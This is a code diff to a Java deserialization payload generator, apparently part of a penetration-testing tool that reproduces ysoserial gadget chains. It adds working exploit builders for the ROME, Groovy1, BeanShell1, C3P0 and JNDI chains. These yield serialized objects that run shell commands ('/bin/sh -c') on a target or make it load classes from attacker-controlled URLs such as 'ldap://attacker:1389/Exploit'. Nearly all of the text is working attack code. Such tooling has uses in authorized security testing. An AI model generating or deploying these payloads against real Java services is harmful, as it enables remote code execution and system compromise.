@@ -9,11 +9,23 @@ import java.rmi.registry.Registry;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
 import java.rmi.server.RemoteRef;
+import java.sql.SQLException;
+import java.sql.SQLFeatureNotSupportedException;
 import java.util.*;
+import java.util.logging.Logger;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.Referenceable;
+import javax.sql.ConnectionPoolDataSource;
+import javax.sql.PooledConnection;
 import javax.xml.transform.Templates;
 
+import bsh.Interpreter;
+import bsh.XThis;
+import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+import com.sun.syndication.feed.impl.ObjectBean;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -22,6 +34,8 @@ import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.beanutils.BeanComparator;
+import org.codehaus.groovy.runtime.ConvertedClosure;
+import org.codehaus.groovy.runtime.MethodClosure;
 
 /**
  * Java deserialization payload generators — comprehensive ysoserial coverage.
@@ -157,29 +171,31 @@ public final class JavaPayloads {
                 case "JRMPClient"                 -> generateJRMPClient(command);
                 case "JRMPListener"               -> generateJRMPListener(command);
 
-                // Tier 3 — require libraries not bundled
-                case "Spring1"                    -> unsupported(chain, "Spring Framework");
-                case "Spring2"                    -> unsupported(chain, "Spring AOP");
-                case "Hibernate1"                 -> unsupported(chain, "Hibernate 5");
-                case "Hibernate2"                 -> unsupported(chain, "Hibernate 5");
-                case "Groovy1"                    -> unsupported(chain, "Groovy 2.3-2.4");
-                case "JNDIExploit"                -> unsupported(chain, "JNDI (use JRMPClient for similar effect)");
-                case "ROME"                       -> unsupported(chain, "ROME 1.0");
-                case "BeanShell1"                 -> unsupported(chain, "BeanShell 2.0b5");
-                case "C3P0"                       -> unsupported(chain, "C3P0");
-                case "Click1"                     -> unsupported(chain, "Apache Click 2.3");
-                case "FileUpload1"                -> unsupported(chain, "commons-fileupload 1.3.1");
-                case "JBossInterceptors1"         -> unsupported(chain, "JBoss Interceptors");
-                case "JavassistWeld1"             -> unsupported(chain, "Weld CDI");
-                case "JSON1"                      -> unsupported(chain, "Spring + json-lib");
-                case "Jython1"                    -> unsupported(chain, "Jython 2.5-2.7");
-                case "MozillaRhino1"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
-                case "MozillaRhino2"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
-                case "Myfaces1"                   -> unsupported(chain, "MyFaces 1.2-2.x");
-                case "Myfaces2"                   -> unsupported(chain, "MyFaces 2.x");
-                case "Vaadin1"                    -> unsupported(chain, "Vaadin 7.x");
-                case "Wicket1"                    -> unsupported(chain, "Wicket commons-fileupload");
-                case "Clojure"                    -> unsupported(chain, "Clojure 1.2+");
+                // Tier 2 — real object construction with bundled libraries
+                case "ROME"                       -> generateROME(command);
+                case "Groovy1"                    -> generateGroovy1(command);
+                case "BeanShell1"                 -> generateBeanShell1(command);
+                case "C3P0"                       -> generateC3P0(command);
+                case "JNDIExploit"                -> generateJNDIExploit(command);
+
+                // Tier 3 — require large libraries not bundled (use ysoserial CLI)
+                case "Spring1"                    -> unsupported(chain, "Spring Framework (~10MB) — use ysoserial CLI");
+                case "Spring2"                    -> unsupported(chain, "Spring AOP (~10MB) — use ysoserial CLI");
+                case "Hibernate1"                 -> unsupported(chain, "Hibernate 5 (~7MB) — use ysoserial CLI");
+                case "Hibernate2"                 -> unsupported(chain, "Hibernate 5 (~7MB) — use ysoserial CLI");
+                case "Click1"                     -> unsupported(chain, "Apache Click 2.3 — use ysoserial CLI");
+                case "FileUpload1"                -> unsupported(chain, "commons-fileupload 1.3.1 — use ysoserial CLI");
+                case "JBossInterceptors1"         -> unsupported(chain, "JBoss Interceptors — use ysoserial CLI");
+                case "JavassistWeld1"             -> unsupported(chain, "Weld CDI — use ysoserial CLI");
+                case "JSON1"                      -> unsupported(chain, "Spring + json-lib — use ysoserial CLI");
+                case "Jython1"                    -> unsupported(chain, "Jython (~15MB) — use ysoserial CLI");
+                case "MozillaRhino1"              -> unsupported(chain, "Mozilla Rhino 1.7R2 — use ysoserial CLI");
+                case "MozillaRhino2"              -> unsupported(chain, "Mozilla Rhino 1.7R2 — use ysoserial CLI");
+                case "Myfaces1"                   -> unsupported(chain, "MyFaces 1.2-2.x — use ysoserial CLI");
+                case "Myfaces2"                   -> unsupported(chain, "MyFaces 2.x — use ysoserial CLI");
+                case "Vaadin1"                    -> unsupported(chain, "Vaadin 7.x — use ysoserial CLI");
+                case "Wicket1"                    -> unsupported(chain, "Wicket — use ysoserial CLI");
+                case "Clojure"                    -> unsupported(chain, "Clojure (~4MB) — use ysoserial CLI");
 
                 default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
             };
@@ -638,6 +654,169 @@ public final class JavaPayloads {
         ReflectionUtils.setFieldValue(uro, "ref", usr);
 
         return ReflectionUtils.serialize((Serializable) uro);
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  ROME — HashMap + ObjectBean + TemplatesImpl
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * ROME: HashMap.readObject() → ObjectBean.hashCode() → EqualsBean.beanHashCode()
+     *       → ToStringBean.toString() → TemplatesImpl.getOutputProperties() → RCE.
+     * Requires ROME 1.0 on target classpath.
+     */
+    private static byte[] generateROME(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
+
+        // Inner: wraps TemplatesImpl with Templates interface
+        ObjectBean delegate = new ObjectBean(Templates.class, templates);
+        // Outer: wraps the inner ObjectBean
+        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
+
+        // Add to HashMap via reflection to avoid triggering hashCode() during serialization
+        return ReflectionUtils.serialize(GadgetUtils.makeHashMap(root, root));
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  Groovy1 — AnnotationInvocationHandler + ConvertedClosure + MethodClosure
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Groovy1: AnnotationInvocationHandler.readObject() → Map.entrySet() (proxy)
+     *          → ConvertedClosure.invoke() → MethodClosure.call()
+     *          → command.execute() (Groovy GDK String.execute → Runtime.exec).
+     * Requires Groovy 2.3-2.4 on target classpath and JDK < 8u72.
+     */
+    private static byte[] generateGroovy1(String command) throws Exception {
+        MethodClosure mc = new MethodClosure(command, "execute");
+        ConvertedClosure cc = new ConvertedClosure(mc, "entrySet");
+
+        Map<?, ?> proxy = (Map<?, ?>) Proxy.newProxyInstance(
+                JavaPayloads.class.getClassLoader(),
+                new Class[]{Map.class}, cc);
+
+        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
+                "sun.reflect.annotation.AnnotationInvocationHandler");
+        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Override.class, proxy);
+
+        return ReflectionUtils.serialize(handler);
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  BeanShell1 — PriorityQueue + XThis.Handler (Comparator proxy)
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * BeanShell1: PriorityQueue.readObject() → heapify → comparator.compare()
+     *             → XThis.Handler.invoke() → Interpreter.eval(compare script)
+     *             → ProcessBuilder.start() → RCE.
+     * Requires BeanShell 2.0b5 on target classpath.
+     */
+    private static byte[] generateBeanShell1(String command) throws Exception {
+        String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
+        String payload = "compare(Object foo, Object bar) {" +
+                "new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"}).start();" +
+                "return new Integer(1);}";
+
+        Interpreter interpreter = new Interpreter();
+        interpreter.eval(payload);
+
+        XThis xt = new XThis(interpreter.getNameSpace(), interpreter);
+        InvocationHandler handler = (InvocationHandler)
+                ReflectionUtils.getFieldValue(xt, "invocationHandler");
+
+        Comparator<?> bshComparator = (Comparator<?>) Proxy.newProxyInstance(
+                JavaPayloads.class.getClassLoader(),
+                new Class[]{Comparator.class}, handler);
+
+        // Safely populate queue with a dummy comparator (avoids triggering BeanShell during serialization)
+        @SuppressWarnings("unchecked")
+        Comparator<Object> inertComp = (Comparator<Object>) (Comparator<?>) String.CASE_INSENSITIVE_ORDER;
+        PriorityQueue<Object> queue = new PriorityQueue<>(2, inertComp);
+        queue.add("a");
+        queue.add("b");
+
+        // Arm: swap in BeanShell comparator
+        ReflectionUtils.setFieldValue(queue, "comparator", bshComparator);
+
+        return ReflectionUtils.serialize(queue);
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  C3P0 — PoolBackedDataSourceBase + JNDI Reference
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * C3P0: PoolBackedDataSourceBase.readObject() → ReferenceIndirector.getObject()
+     *       → NamingManager.getObjectInstance() → downloads class from remote URL → RCE.
+     * Requires C3P0 on target classpath.
+     * Command format: "http://attacker.com:8000/:ExploitClass"
+     */
+    private static byte[] generateC3P0(String command) throws Exception {
+        int sep = command.lastIndexOf(':');
+        if (sep < 0) {
+            throw new IllegalArgumentException(
+                    "C3P0 command format: <base_url>:<classname>  (e.g. http://attacker:8000/:Exploit)");
+        }
+        String url = command.substring(0, sep);
+        String className = command.substring(sep + 1);
+
+        PoolBackedDataSourceBase b = ReflectionUtils.createWithoutConstructor(PoolBackedDataSourceBase.class);
+        ReflectionUtils.setFieldValue(b, "connectionPoolDataSource", new C3P0PoolSource(className, url));
+
+        return ReflectionUtils.serialize(b);
+    }
+
+    /** Custom ConnectionPoolDataSource that returns a JNDI Reference pointing to an attacker URL. */
+    private static final class C3P0PoolSource implements ConnectionPoolDataSource, Referenceable, Serializable {
+        private final String className;
+        private final String url;
+
+        C3P0PoolSource(String className, String url) {
+            this.className = className;
+            this.url = url;
+        }
+
+        @Override public Reference getReference() throws NamingException {
+            return new Reference("exploit", className, url);
+        }
+        @Override public PooledConnection getPooledConnection() throws SQLException { throw new SQLException("N/A"); }
+        @Override public PooledConnection getPooledConnection(String u, String p) throws SQLException { throw new SQLException("N/A"); }
+        @Override public PrintWriter getLogWriter() throws SQLException { return null; }
+        @Override public void setLogWriter(PrintWriter out) throws SQLException {}
+        @Override public void setLoginTimeout(int seconds) throws SQLException {}
+        @Override public int getLoginTimeout() throws SQLException { return 0; }
+        @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; }
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  JNDIExploit — JdbcRowSetImpl JNDI lookup
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * JNDIExploit: JdbcRowSetImpl with dataSourceName pointing to attacker JNDI server.
+     * On deserialization, triggers JNDI lookup → remote class loading → RCE.
+     * Command format: JNDI URL (e.g. "ldap://attacker:1389/Exploit" or "rmi://attacker:1099/Exploit").
+     * JDK-only — no external dependencies required on target.
+     * Note: Requires target JDK < 8u191 (trustURLCodebase=true) for remote class loading.
+     */
+    private static byte[] generateJNDIExploit(String command) throws Exception {
+        ReflectionUtils.getUnsafe();
+
+        // Open java.sql.rowset module for JdbcRowSetImpl access
+        Class<?> jdbcRowSetClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
+        Object rowSet = ReflectionUtils.createWithoutConstructor(jdbcRowSetClass);
+
+        // Set JNDI URL via reflection (avoid triggering connect() via setters)
+        ReflectionUtils.setFieldValue(rowSet, "dataSource", command);
+
+        // Wrap in BadAttributeValueExpException for trigger:
+        // readObject() → toString() → getDatabaseMetaData() → connect() → JNDI lookup
+        javax.management.BadAttributeValueExpException bave =
+                new javax.management.BadAttributeValueExpException(null);
+        ReflectionUtils.setFieldValue(bave, "val", rowSet);
+
+        return ReflectionUtils.serialize(bave);
     }
 
     // ════════════════════════════════════════════════════════════════════════
